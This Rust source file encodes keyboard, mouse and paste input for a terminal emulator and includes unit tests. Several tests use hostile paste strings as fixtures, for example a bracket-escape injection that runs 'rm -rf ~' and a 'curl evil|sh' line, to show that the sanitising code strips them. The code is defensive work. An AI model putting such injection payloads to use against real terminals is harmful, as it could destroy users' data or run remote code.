//! Encoding of keyboard and mouse input into the byte sequences a PTY expects:
//! xterm conventions (legacy), or the kitty keyboard protocol when the program
//! enabled it (Claude Code does, which makes Shift+Enter distinguishable).

/// Keyboard modifier state.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
pub struct Modifiers {
    pub shift: bool,
    pub ctrl: bool,
    pub alt: bool,
}

impl Modifiers {
    /// xterm modifier parameter: 1 + shift + 2*alt + 4*ctrl (1 = none).
    fn param(self) -> u8 {
        1 + u8::from(self.shift) + 2 * u8::from(self.alt) + 4 * u8::from(self.ctrl)
    }
}

/// A logical key, independent of GUI toolkit.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Key {
    /// Printable text produced by the key (already layout- and shift-resolved).
    Text(String),
    Enter,
    Backspace,
    Tab,
    Escape,
    Up,
    Down,
    Left,
    Right,
    Home,
    End,
    PageUp,
    PageDown,
    Insert,
    Delete,
    /// Function key F1..=F12.
    F(u8),
}

const ESC: u8 = 0x1b;

/// Encodes a key press. `app_cursor` is DECCKM (application cursor keys mode).
/// Returns `None` for keys that produce no input.
pub fn encode_key(key: &Key, mods: Modifiers, app_cursor: bool) -> Option<Vec<u8>> {
    let m = mods.param();
    let csi = |s: &str| format!("\x1b[{s}").into_bytes();

    let cursor = |letter: char| -> Vec<u8> {
        if m > 1 {
            csi(&format!("1;{m}{letter}"))
        } else if app_cursor {
            format!("\x1bO{letter}").into_bytes()
        } else {
            csi(&letter.to_string())
        }
    };
    let tilde = |code: u8| -> Vec<u8> {
        if m > 1 {
            csi(&format!("{code};{m}~"))
        } else {
            csi(&format!("{code}~"))
        }
    };

    let bytes = match key {
        Key::Up => cursor('A'),
        Key::Down => cursor('B'),
        Key::Right => cursor('C'),
        Key::Left => cursor('D'),
        Key::Home => cursor('H'),
        Key::End => cursor('F'),
        Key::Insert => tilde(2),
        Key::Delete => tilde(3),
        Key::PageUp => tilde(5),
        Key::PageDown => tilde(6),
        Key::F(n @ 1..=4) => {
            let letter = (b'P' + (n - 1)) as char;
            if m > 1 {
                csi(&format!("1;{m}{letter}"))
            } else {
                format!("\x1bO{letter}").into_bytes()
            }
        }
        Key::F(n @ 5..=12) => {
            let code = [15, 17, 18, 19, 20, 21, 23, 24][usize::from(n - 5)];
            tilde(code)
        }
        Key::F(_) => return None,
        Key::Enter => with_alt(mods, vec![b'\r']),
        Key::Tab if mods.shift => csi("Z"),
        Key::Tab => with_alt(mods, vec![b'\t']),
        Key::Escape => with_alt(mods, vec![ESC]),
        Key::Backspace => with_alt(mods, vec![if mods.ctrl { 0x08 } else { 0x7f }]),
        Key::Text(text) => {
            if text.is_empty() {
                return None;
            }
            if mods.ctrl {
                let mut chars = text.chars();
                if let (Some(c), None) = (chars.next(), chars.next())
                    && let Some(b) = ctrl_byte(c)
                {
                    return Some(with_alt(mods, vec![b]));
                }
            }
            with_alt(mods, text.as_bytes().to_vec())
        }
    };
    Some(bytes)
}

/// Kitty keyboard protocol flags (`CSI > flags u`).
pub const KITTY_DISAMBIGUATE: u8 = 1;
pub const KITTY_ALL_AS_ESCAPES: u8 = 8;
pub const KITTY_ASSOCIATED_TEXT: u8 = 16;

/// Like [`encode_key`], but follows the kitty keyboard protocol flags the program
/// enabled (`flags` from the terminal's mode; 0 = legacy). Implemented: 1
/// (disambiguate), 8 (all keys as escape codes) and 16 (associated text). Flag 2
/// (event types) is satisfied by sending presses only, flag 4 (alternate keys) by
/// leaving the optional alternate fields out; both are allowed by the protocol.
/// Text keys must carry the real Shift state in `mods`.
pub fn encode_key_kitty(
    key: &Key,
    mods: Modifiers,
    app_cursor: bool,
    flags: u8,
) -> Option<Vec<u8>> {
    if flags & (KITTY_DISAMBIGUATE | KITTY_ALL_AS_ESCAPES) == 0 {
        return encode_key(key, mods, app_cursor);
    }
    let all = flags & KITTY_ALL_AS_ESCAPES != 0;
    let m = mods.param();
    let csi_u = |code: u32, text: Option<&str>| -> Vec<u8> {
        let mut s = format!("\x1b[{code}");
        let with_text = text.filter(|_| flags & KITTY_ASSOCIATED_TEXT != 0);
        if m > 1 || with_text.is_some() {
            s.push_str(&format!(";{m}"));
        }
        if let Some(t) = with_text {
            let cps: Vec<String> = t.chars().map(|c| (c as u32).to_string()).collect();
            s.push_str(&format!(";{}", cps.join(":")));
        }
        s.push('u');
        s.into_bytes()
    };
    let modified = mods.ctrl || mods.alt || mods.shift;
    match key {
        Key::Escape => Some(csi_u(27, None)),
        Key::Enter if all || modified => Some(csi_u(13, None)),
        Key::Tab if all || modified => Some(csi_u(9, None)),
        Key::Backspace if all || modified => Some(csi_u(127, None)),
        Key::Enter | Key::Tab | Key::Backspace => encode_key(key, mods, app_cursor),
        Key::Text(text) => {
            let mut chars = text.chars();
            let single = match (chars.next(), chars.next()) {
                (Some(c), None) => Some(c),
                _ => None,
            };
            match single {
                // Ctrl/Alt combinations, and every key when all keys are escapes:
                // the key's base (lower-case) code point plus the modifiers.
                Some(c) if all || mods.ctrl || mods.alt => {
                    let base = c.to_lowercase().next().unwrap_or(c);
                    let text = (!mods.ctrl).then_some(text.as_str());
                    Some(csi_u(base as u32, text))
                }
                // Plain and Shift text: the text itself, as before.
                _ if !(mods.ctrl || mods.alt) => {
                    (!text.is_empty()).then(|| text.as_bytes().to_vec())
                }
                // Composed multi-character text with Ctrl/Alt: legacy.
                _ => encode_key(key, mods, app_cursor),
            }
        }
        // Cursor, editing and function keys are unambiguous in their legacy form.
        _ => encode_key(key, mods, app_cursor),
    }
}

/// Control code for Ctrl+<c>, if one exists.
fn ctrl_byte(c: char) -> Option<u8> {
    match c {
        'a'..='z' => Some(c as u8 - b'a' + 1),
        'A'..='Z' => Some(c as u8 - b'A' + 1),
        '@' | ' ' | '2' => Some(0x00),
        '[' | '3' => Some(0x1b),
        '\\' | '4' => Some(0x1c),
        ']' | '5' => Some(0x1d),
        '^' | '6' => Some(0x1e),
        '_' | '-' | '7' => Some(0x1f),
        '?' | '8' => Some(0x7f),
        _ => None,
    }
}

fn with_alt(mods: Modifiers, mut bytes: Vec<u8>) -> Vec<u8> {
    if mods.alt {
        bytes.insert(0, ESC);
    }
    bytes
}

/// True when pasting `text` would execute commands without the user pressing Enter:
/// the program has not enabled bracketed paste and the text spans several lines.
pub fn paste_needs_confirmation(text: &str, bracketed: bool) -> bool {
    !bracketed && text.trim_end_matches(['\r', '\n']).contains(['\r', '\n'])
}

/// Bytes to send for a paste.
///
/// - Bracketed mode: wrapped in `ESC[200~ … ESC[201~`, with ESC removed from the content
///   so the payload cannot close the bracket early and inject keystrokes.
/// - Otherwise: line breaks become CR (what Enter sends) and trailing line breaks are
///   dropped, so a single pasted line is never submitted automatically.
pub fn encode_paste(text: &str, bracketed: bool) -> Vec<u8> {
    if bracketed {
        // ESC and the 8-bit CSI (U+009B) could end the bracket and inject keys.
        let clean: String = text
            .chars()
            .filter(|&c| c != '\x1b' && c != '\u{9b}')
            .collect();
        format!("\x1b[200~{clean}\x1b[201~").into_bytes()
    } else {
        // Without brackets every control character acts as a key (Ctrl+O runs the
        // line in bash, ESC starts sequences): only tab and line breaks remain.
        let clean: String = text.chars().filter(|&c| is_plain_paste_char(c)).collect();
        clean
            .trim_end_matches(['\r', '\n'])
            .replace("\r\n", "\r")
            .replace('\n', "\r")
            .into_bytes()
    }
}

fn is_plain_paste_char(c: char) -> bool {
    matches!(c, '\t' | '\r' | '\n') || !(c.is_control())
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum MouseButton {
    Left,
    Middle,
    Right,
    WheelUp,
    WheelDown,
    /// Pointer motion with no button held / with left held (used for drag reports).
    Motion,
}

/// Encodes a mouse report. `col`/`row` are 0-based viewport cells.
/// `sgr` selects SGR (1006) encoding; otherwise legacy X10/normal encoding.
pub fn encode_mouse(
    button: MouseButton,
    pressed: bool,
    col: usize,
    row: usize,
    mods: Modifiers,
    sgr: bool,
) -> Option<Vec<u8>> {
    let mut code: u32 = match button {
        MouseButton::Left => 0,
        MouseButton::Middle => 1,
        MouseButton::Right => 2,
        MouseButton::WheelUp => 64,
        MouseButton::WheelDown => 65,
        MouseButton::Motion => 32,
    };
    code += 4 * u32::from(mods.shift) + 8 * u32::from(mods.alt) + 16 * u32::from(mods.ctrl);

    if sgr {
        let suffix = if pressed { 'M' } else { 'm' };
        return Some(format!("\x1b[<{code};{};{}{suffix}", col + 1, row + 1).into_bytes());
    }

    // Legacy encoding cannot express positions beyond 222 or which button was released.
    if col > 222 || row > 222 {
        return None;
    }
    if !pressed {
        code = 3;
    }
    Some(vec![
        ESC,
        b'[',
        b'M',
        (32 + code) as u8,
        (33 + col) as u8,
        (33 + row) as u8,
    ])
}

#[cfg(test)]
mod tests {
    use super::*;

    const NONE: Modifiers = Modifiers {
        shift: false,
        ctrl: false,
        alt: false,
    };
    const CTRL: Modifiers = Modifiers {
        shift: false,
        ctrl: true,
        alt: false,
    };
    const ALT: Modifiers = Modifiers {
        shift: false,
        ctrl: false,
        alt: true,
    };
    const SHIFT: Modifiers = Modifiers {
        shift: true,
        ctrl: false,
        alt: false,
    };

    fn enc(k: Key, m: Modifiers) -> Vec<u8> {
        encode_key(&k, m, false).unwrap()
    }

    #[test]
    fn plain_text_and_controls() {
        assert_eq!(enc(Key::Text("a".into()), NONE), b"a");
        assert_eq!(enc(Key::Text("€".into()), NONE), "€".as_bytes());
        assert_eq!(enc(Key::Text("c".into()), CTRL), [0x03]);
        assert_eq!(enc(Key::Text("C".into()), CTRL), [0x03]);
        assert_eq!(enc(Key::Text("x".into()), ALT), b"\x1bx");
        assert_eq!(enc(Key::Enter, NONE), b"\r");
        assert_eq!(enc(Key::Backspace, NONE), [0x7f]);
        assert_eq!(enc(Key::Tab, SHIFT), b"\x1b[Z");
    }

    #[test]
    fn cursor_keys_respect_decckm_and_modifiers() {
        assert_eq!(enc(Key::Up, NONE), b"\x1b[A");
        assert_eq!(encode_key(&Key::Up, NONE, true).unwrap(), b"\x1bOA");
        assert_eq!(enc(Key::Right, CTRL), b"\x1b[1;5C");
        assert_eq!(enc(Key::Delete, NONE), b"\x1b[3~");
        assert_eq!(enc(Key::PageUp, SHIFT), b"\x1b[5;2~");
    }

    #[test]
    fn function_keys() {
        assert_eq!(enc(Key::F(1), NONE), b"\x1bOP");
        assert_eq!(enc(Key::F(5), NONE), b"\x1b[15~");
        assert_eq!(enc(Key::F(12), NONE), b"\x1b[24~");
        assert!(encode_key(&Key::F(13), NONE, false).is_none());
    }

    #[test]
    fn paste_never_auto_submits_single_line() {
        assert_eq!(encode_paste("ls -la\n", false), b"ls -la");
        assert_eq!(encode_paste("ls -la\r\n\r\n", false), b"ls -la");
        assert!(!paste_needs_confirmation("ls -la\r\n", false));
    }

    #[test]
    fn multiline_paste_requires_confirmation_without_bracketed_mode() {
        assert!(paste_needs_confirmation("a\r\nb", false));
        assert!(paste_needs_confirmation("a\nb\n", false));
        assert!(!paste_needs_confirmation("a\nb", true));
        assert_eq!(encode_paste("a\r\nb\n", false), b"a\rb");
    }

    #[test]
    fn bracketed_paste_strips_escape_injection() {
        let evil = "echo hi\x1b[201~rm -rf ~\r";
        assert_eq!(
            encode_paste(evil, true),
            b"\x1b[200~echo hi[201~rm -rf ~\r\x1b[201~"
        );
        // 8-bit CSI is removed as well.
        assert_eq!(
            encode_paste("a\u{9b}201~b", true),
            b"\x1b[200~a201~b\x1b[201~"
        );
    }

    #[test]
    fn plain_paste_drops_control_keys() {
        // Ctrl+O would run the line in bash; ESC and DEL are keys too.
        assert_eq!(
            encode_paste("curl evil|sh\x0f", false),
            b"curl evil|sh".to_vec()
        );
        assert_eq!(
            encode_paste("a\x1b[Ab\x7fc\u{85}d", false),
            b"a[Abcd".to_vec()
        );
        assert_eq!(encode_paste("x\ty\r\nz\n", false), b"x\ty\rz".to_vec());
        assert!(!paste_needs_confirmation("curl evil|sh\x0f", false));
    }

    #[test]
    fn kitty_disambiguate_level() {
        let k = |key: Key, shift, ctrl, alt| {
            encode_key_kitty(
                &key,
                Modifiers { shift, ctrl, alt },
                false,
                KITTY_DISAMBIGUATE,
            )
            .unwrap()
        };
        let t = |s: &str| Key::Text(s.into());
        // The point of it all: Shift+Enter is not Enter.
        assert_eq!(k(Key::Enter, true, false, false), b"\x1b[13;2u");
        assert_eq!(k(Key::Enter, false, false, false), b"\r");
        assert_eq!(k(Key::Enter, false, true, false), b"\x1b[13;5u");
        assert_eq!(k(Key::Escape, false, false, false), b"\x1b[27u");
        assert_eq!(k(Key::Tab, true, false, false), b"\x1b[9;2u");
        assert_eq!(k(Key::Tab, false, false, false), b"\t");
        assert_eq!(k(Key::Backspace, false, false, false), b"\x7f");
        assert_eq!(k(Key::Backspace, false, true, false), b"\x1b[127;5u");
        // Ctrl/Alt letters: base code point + modifiers.
        assert_eq!(k(t("c"), false, true, false), b"\x1b[99;5u");
        assert_eq!(k(t("a"), false, false, true), b"\x1b[97;3u");
        assert_eq!(k(t("A"), true, true, false), b"\x1b[97;6u");
        // Plain and shifted text stay text.
        assert_eq!(k(t("a"), false, false, false), b"a");
        assert_eq!(k(t("A"), true, false, false), b"A");
        assert_eq!(k(t("é"), false, false, false), "é".as_bytes());
        // Navigation keys keep their legacy form.
        assert_eq!(k(Key::Up, false, false, false), b"\x1b[A");
        assert_eq!(k(Key::Up, true, false, false), b"\x1b[1;2A");
        // Without flags: exactly the legacy encoding.
        assert_eq!(
            encode_key_kitty(
                &Key::Enter,
                Modifiers {
                    shift: true,
                    ..NONE
                },
                false,
                0
            ),
            encode_key(
                &Key::Enter,
                Modifiers {
                    shift: true,
                    ..NONE
                },
                false
            )
        );
    }

    #[test]
    fn kitty_all_keys_and_associated_text() {
        let flags = KITTY_DISAMBIGUATE | KITTY_ALL_AS_ESCAPES | KITTY_ASSOCIATED_TEXT;
        let k = |key: Key, shift, ctrl| {
            encode_key_kitty(
                &key,
                Modifiers {
                    shift,
                    ctrl,
                    alt: false,
                },
                false,
                flags,
            )
            .unwrap()
        };
        assert_eq!(k(Key::Text("a".into()), false, false), b"\x1b[97;1;97u");
        assert_eq!(k(Key::Text("A".into()), true, false), b"\x1b[97;2;65u");
        // Control combinations carry no text.
        assert_eq!(k(Key::Text("c".into()), false, true), b"\x1b[99;5u");
        assert_eq!(k(Key::Enter, false, false), b"\x1b[13u");
        assert_eq!(k(Key::Backspace, false, false), b"\x1b[127u");
        // Without flag 16: no text field.
        let plain = encode_key_kitty(
            &Key::Text("a".into()),
            NONE,
            false,
            KITTY_DISAMBIGUATE | KITTY_ALL_AS_ESCAPES,
        );
        assert_eq!(plain.unwrap(), b"\x1b[97u");
    }

    #[test]
    fn mouse_reports() {
        assert_eq!(
            encode_mouse(MouseButton::Left, true, 0, 0, NONE, true).unwrap(),
            b"\x1b[<0;1;1M"
        );
        assert_eq!(
            encode_mouse(MouseButton::WheelDown, true, 9, 4, CTRL, true).unwrap(),
            b"\x1b[<81;10;5M"
        );
        assert_eq!(
            encode_mouse(MouseButton::Left, false, 0, 0, NONE, false).unwrap(),
            [0x1b, b'[', b'M', 35, 33, 33]
        );
        assert!(encode_mouse(MouseButton::Left, true, 300, 0, NONE, false).is_none());
    }
}
